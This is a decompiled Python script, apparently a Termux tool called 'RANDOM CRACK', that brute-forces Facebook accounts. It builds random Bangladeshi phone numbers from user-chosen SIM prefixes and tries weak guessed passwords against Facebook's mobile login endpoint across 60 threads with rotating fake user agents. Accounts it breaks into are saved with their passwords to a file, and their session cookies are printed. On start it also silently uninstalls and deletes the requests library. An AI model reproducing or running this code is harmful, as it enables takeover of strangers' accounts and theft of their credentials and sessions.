""" Decompiled by Exotic Hridoy """

import os
import sys
import time
import json
import random
import re
import string
import uuid
import zlib
import struct
import subprocess
import platform
from os import system as s
from urllib import request as req
import requests
from pip._vendor import requests as pip_requests
import mechanize
import bs4
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as tred
from requests.exceptions import ConnectionError
from zlib import decompress as dec
import base64
import datetime

rrq = 'requests'
mm = 'uninstall'
try:
    os.system(f'pip {mm} {rrq} -y')
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
except:
    print('Net Error')
    exit()

try:
    import requests
except ImportError:
    print('\ninstalling requests !...\n')
    time.sleep(0.5)
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\ninstalling futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\ninstalling bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')

ugen = []
for sat in range(1000):
    a = 'NokiaX'
    b = random.randrange(1, 9)
    c = '-0'
    d = random.randrange(1, 9)
    e = '/'
    f = random.randrange(1, 9)
    g = '.0 ('
    h = random.randrange(1, 12)
    i = 'Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j = 'UNTRUSTED/'
    k = random.randrange(1, 3)
    l = '.0'
    uaku2 = f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for i in range(int(1000)):
    aaa = 'Mozilla/5.0 (Linux; U; Android'
    bbb = random.choice(['4', '6', '7', '8', '9', '10', '11', '12'])
    ccc = 'en-us; GT-'
    ddd = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    eee = random.randint(1, 999)
    fff = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    ggg = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    hhh = random.randint(73, 100)
    iii = '0'
    jjj = random.randint(4200, 4900)
    kkk = random.randint(40, 150)
    lll = 'Mobile Safari/537.36'
    ua = f'{aaa} {bbb}; {ccc}{ddd}{eee}{fff}) {ggg}{hhh}.{iii}.{jjj}.{kkk} {lll}'
    ugen.append(ua)

yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
rad = '\x1b[1;31m'
green = '\x1b[1;32m'
yelloww = '\x1b[1;33m'
blue = '\x1b[1;34m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;41m'
pvt = '\x1b[1;0m'

my_color = [white, blue, green]
warna = random.choice(my_color)
loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

def logo():
    os.system('clear')
    print('''
\x1b[1;91m    _____   ___   ______  _____________   ________
\x1b[1;92m   /  _/ | / / | / / __ \\/ ____/ ____/ | / /_  __/
\x1b[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /
\x1b[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /
\x1b[1;95m/___/_/ |_/_/ |_/\\____/\\____/_____/_/ |_/ /_/     \x1b[1;92m

\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m
[\x1b[1;91m✓\x1b[1;92m]  CREATE BY    \x1b[1;91m:  \x1b[1;92mMUMIT ISLAM HIMU
[\x1b[1;91m✓\x1b[1;92m]  TOOL         \x1b[1;91m:  \x1b[1;92mRANDOM CRACK
[\x1b[1;91m✓\x1b[1;92m]  STATUS       \x1b[1;91m:  \x1b[1;92mFREE ENJOY
[\x1b[1;91m✓\x1b[1;92m]  USE SYSTEM   \x1b[1;91m:  \x1b[1;92mDATA\x1b[1;91m/\x1b[1;92mWIFI
[\x1b[1;91m✓\x1b[1;92m]  GITHUB       \x1b[1;91m:  \x1b[1;92mMUMIT-404-CYBER
\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

def linex():
    print(f'{cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def innocent():
    os.system('clear')
    logo()
    print(f'{green}[{rad}1{green}] START RANDOM CRACK')
    _____mahadi_____ = input(f'{green}[{rad}?{green}] SELECT MENU {rad}: {cyan}')
    if _____mahadi_____ in ['01', '1']:
        ___uids___()
    elif _____mahadi_____ in ['00', '0']:
        exit()
    else:
        print(f'\n[!]{rad} CHOOSE A VALID OPTION')
        time.sleep(1)
        innocent()

def ___uids___():
    user = []
    os.system('clear')
    logo()
    print(f'{green}[{rad}•{green}] {cyan}BD SIM CODE {rad}:{green} 017 {cyan}<> {green}019 {cyan}<> {green}018 {cyan}<> {green}016 {cyan}<> {green}013')
    linex()
    code = input(f'{green}[{rad}?{green}] SELECT CODE {rad}:{cyan} ')
    linex()
    print(f'{green}[{rad}•{green}] {cyan}EXAMPLE {rad}: {green}3000 {cyan}<> {green}5000 {cyan}<> {green}10000 {cyan}<> {green}30000')
    linex()
    limit = int(input(f'{green}[{rad}?{green}] SELECT LIMIT {rad}:{cyan} '))
    os.system('clear')
    logo()
    print(f'{green}[{rad}1{green}] METHOD MAX')
    linex()
    __mxd__ = input(f'{green}[{rad}?{green}] SELECT {rad}:{cyan} ')
    for nmbr in range(limit):
        vuda = ''.join((random.choice(string.digits) for _ in range(2)))
        nunu = ''.join((random.choice(string.digits) for _ in range(2)))
        nmp = ''.join((random.choice(string.digits) for _ in range(4)))
        user.append(nmp)
    with ThreadPool(max_workers=60) as SefatMahadi:
        os.system('clear')
        logo()
        tl = str(len(user))
        print(f'{green}[{rad}•{green}] SIM CODE      {rad}: {cyan} {code} ')
        print(f'{green}[{rad}•{green}] TOTAL ID      {rad}:  {cyan}' + tl)
        print(f'{green}[{rad}•{green}] {white}[{green}ON{white}/{yelloww}OFF{white}]{green} AEROPLANE FOR SPEED UP')
        linex()
        for guru in user:
            uid = code + vuda + nunu + guru
            pwx = [vuda + nunu + guru, nunu + guru, code, vuda + nunu, code + code, code, '123', 'free fire', 'bangla', '@@@###', '@#@#@#']
            if __mxd__ in ['01', '1']:
                SefatMahadi.submit(___random___, uid, pwx)
            else:
                SefatMahadi.submit(___random___, uid, pwx)
    print('')
    linex()
    print(f'{green}[{rad}•{green}] TOTAL OK ACCOUNT  :  {cyan}{len(oks)}')
    print(f'{green}[{rad}•{green}] CRACK PROCESS HAS COMPLETED')
    print(f'{green}[{rad}•{green}] IDS SAVED IN /INNOCENT-GREEN.txt')
    exit()

def ___random___(uid, pwx):
    global loop
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\r{white}[{green}INNOCENT-XD{white}]{cyan}<>{white}[{purple}%s{white}]{cyan}<>{white}[{green}OK{rad}•{green}%s{white}]' % (loop, len(oks)))
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                'lsd': re.search('name=\"lsd\" value=\"(.*?)\"', str(free_fb)).group(1),
                'jazoest': re.search('name=\"jazoest\" value=\"(.*?)\"', str(free_fb)).group(1),
                'm_ts': re.search('name=\"m_ts\" value=\"(.*?)\"', str(free_fb)).group(1),
                'li': re.search('name=\"li\" value=\"(.*?)\"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': uid,
                'pass': ps,
                'login': 'Log In'
            }
            header_freefb = {
                'authority': 'p.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://p.facebook.com',
                'referer': 'https://p.facebook.com/',
                'sec-ch-ua': '\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '\"Android\"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'user-agent': pro
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ';'.join([key + '=' + value for key, value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r\x1b[1;37m[\x1b[1;32mINNOCENT-OK\x1b[1;37m]\x1b[1;32m ' + cid + f' | ' + ps + f'\x1b[0;97m')
                    print('\r\r\x1b[1;36m[🍪] COOKIE\x1b[1;33m : ' + coki)
                    open('/sdcard/INNOCENT-GREEN.txt', 'a').write(cid + ' | ' + ps + '\n')
                    oks.append(cid)
                break
        loop += 1
    except:
        return None

if __name__ == '__main__':
    os.system('clear')
    os.system('git pull')
    innocent()
